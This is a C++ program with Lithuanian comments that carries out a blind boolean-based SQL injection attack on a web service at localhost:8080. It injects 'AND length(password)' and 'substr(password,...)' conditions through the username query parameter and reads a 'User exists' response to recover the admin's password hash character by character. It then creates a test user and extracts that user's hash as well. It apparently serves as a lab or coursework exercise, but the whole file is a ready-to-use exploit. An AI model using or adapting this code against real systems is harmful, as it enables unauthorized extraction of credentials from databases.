#include <winsock2.h>
#include <iostream>
#include <string>
#include <cctype>

#pragma comment(lib, "ws2_32.lib")

using namespace std;

string urlEncode(const string& input) {
    static const char* hex = "0123456789ABCDEF";
    string encoded;
    encoded.reserve(input.size() * 3);

    for (unsigned char c : input) {
        if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') {
            encoded.push_back(static_cast<char>(c));
        } else {
            encoded.push_back('%');
            encoded.push_back(hex[(c >> 4) & 0x0F]);
            encoded.push_back(hex[c & 0x0F]);
        }
    }

    return encoded;
}

int getHttpStatusCode(const string& response) {
    size_t start = response.find("HTTP/");
    if (start == string::npos) {
        return -1;
    }

    size_t codePos = response.find(' ', start);
    if (codePos == string::npos || codePos + 3 >= response.size()) {
        return -1;
    }

    return stoi(response.substr(codePos + 1, 3));
}

string getHttpBody(const string& response) {
    size_t bodyPos = response.find("\r\n\r\n");
    if (bodyPos == string::npos) {
        return "";
    }
    return response.substr(bodyPos + 4);
}

// Funkcija HTTP užklausai siųsti
string sendRequest(const string& request) {
    WSADATA wsa;
    SOCKET s;
    struct sockaddr_in server;
    char buffer[8192];

    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        cout << "[-] WSAStartup failed\n";
        return "";
    }

    s = socket(AF_INET, SOCK_STREAM, 0);
    if (s == INVALID_SOCKET) {
        cout << "[-] Socket creation failed (" << WSAGetLastError() << ")\n";
        WSACleanup();
        return "";
    }

    server.sin_addr.s_addr = inet_addr("127.0.0.1");
    server.sin_family = AF_INET;
    server.sin_port = htons(8080);

    if (connect(s, (struct sockaddr*)&server, sizeof(server)) < 0) {
        cout << "[-] Connection failed to 127.0.0.1:8080 (" << WSAGetLastError() << ")\n";
        closesocket(s);
        WSACleanup();
        return "";
    }

    int totalSent = 0;
    int requestSize = static_cast<int>(request.size());
    while (totalSent < requestSize) {
        int sent = send(s, request.c_str() + totalSent, requestSize - totalSent, 0);
        if (sent == SOCKET_ERROR) {
            cout << "[-] Send failed (" << WSAGetLastError() << ")\n";
            closesocket(s);
            WSACleanup();
            return "";
        }
        totalSent += sent;
    }

    string response;
    while (true) {
        int recv_size = recv(s, buffer, sizeof(buffer), 0);
        if (recv_size == SOCKET_ERROR) {
            cout << "[-] Receive failed (" << WSAGetLastError() << ")\n";
            closesocket(s);
            WSACleanup();
            return "";
        }
        if (recv_size == 0) {
            break;
        }
        response.append(buffer, recv_size);
    }

    closesocket(s);
    WSACleanup();

    return response;
}

// Hash ilgio radimas
int findHashLength(string user) {
    for (int len = 1; len <= 64; len++) {

        string payload = user + "' AND length(password)=" + to_string(len) + " -- ";
        string encodedPayload = urlEncode(payload);

        string request =
            "GET /users?username=" + encodedPayload + " HTTP/1.1\r\n"
            "Host: localhost:8080\r\n"
            "Connection: close\r\n\r\n";

        string response = sendRequest(request);
        if (response.empty()) {
            cout << "[-] HTTP request failed while checking hash length\n";
            return -1;
        }

        int statusCode = getHttpStatusCode(response);
        if (statusCode != 200) {
            cout << "[-] Unexpected HTTP status while checking hash length: " << statusCode << endl;
            return -1;
        }

        if (response.find("User exists") != string::npos) {
            cout << "[+] Hash ilgis: " << len << endl;
            return len;
        }
    }

    cout << "[-] Nepavyko rasti hash ilgio\n";
    return -1;
}

// Hash išgavimas
string extractHash(string user, int length) {
    string charset = "0123456789abcdef";
    string hash = "";

    for (int pos = 1; pos <= length; pos++) {
        bool found = false;

        for (char c : charset) {

            string payload = user + "' AND substr(password," + to_string(pos) + ",1)='" + c + "' -- ";
            string encodedPayload = urlEncode(payload);

            string request =
                "GET /users?username=" + encodedPayload + " HTTP/1.1\r\n"
                "Host: localhost:8080\r\n"
                "Connection: close\r\n\r\n";

            string response = sendRequest(request);
            if (response.empty()) {
                cout << "\n[-] HTTP request failed while extracting hash\n";
                return "";
            }

            int statusCode = getHttpStatusCode(response);
            if (statusCode != 200) {
                cout << "\n[-] Unexpected HTTP status while extracting hash: " << statusCode << endl;
                return "";
            }

            if (response.find("User exists") != string::npos) {
                hash += c;
                if (pos % 5 == 0 || pos == length) {
                    cout << "\r[+] Hash extraction progress: " << pos << "/" << length << flush;
                }
                found = true;
                break;
            }
        }

        if (!found) {
            cout << "\n[-] Nerastas simbolis pozicijoje " << pos << endl;
            hash += "?";
        }
    }

    cout << endl;

    return hash;
}

// Naujo vartotojo sukūrimas
bool createUser() {

    string json = "{\"userName\":\"alex1\",\"userFName\":\"Alexander\",\"userLName\":\"Bob\",\"password\":\"guessme\"}";

    string request =
        "POST /users HTTP/1.1\r\n"
        "Host: localhost:8080\r\n"
        "Content-Type: application/json\r\n"
        "Content-Length: " + to_string(json.length()) + "\r\n"
        "Connection: close\r\n\r\n" +
        json;

    string response = sendRequest(request);
    if (response.empty()) {
        cout << "[-] User creation failed: no HTTP response\n";
        return false;
    }

    int statusCode = getHttpStatusCode(response);
    string body = getHttpBody(response);

    if (statusCode == 201) {
        cout << "[+] User created successfully (HTTP 201)\n";
        return true;
    }

    cout << "[-] User creation failed (HTTP " << statusCode << ")\n";
    cout << "[-] Response body: " << body << endl;
    return false;
}

// MAIN
int main() {

    cout << "=== ADMIN HASH ===\n";

    string user = "admin";

    int len = findHashLength(user);
    if (len == -1) return 1;

    string hash = extractHash(user, len);
    if (hash.empty()) return 1;

    cout << "\n[+] Admin hash: " << hash << endl;


    cout << "\n=== KURIAM NAUJA VARTOTOJA ===\n";
    if (!createUser()) {
        cout << "[!] Tesiama toliau be naujo vartotojo sukurimo\n";
    }


    cout << "\n=== NAUJO USER HASH ===\n";

    string newUser = "alex1";

    int newLen = findHashLength(newUser);
    if (newLen == -1) return 1;

    string newHash = extractHash(newUser, newLen);
    if (newHash.empty()) return 1;

    cout << "\n[+] New user hash: " << newHash << endl;

    return 0;
}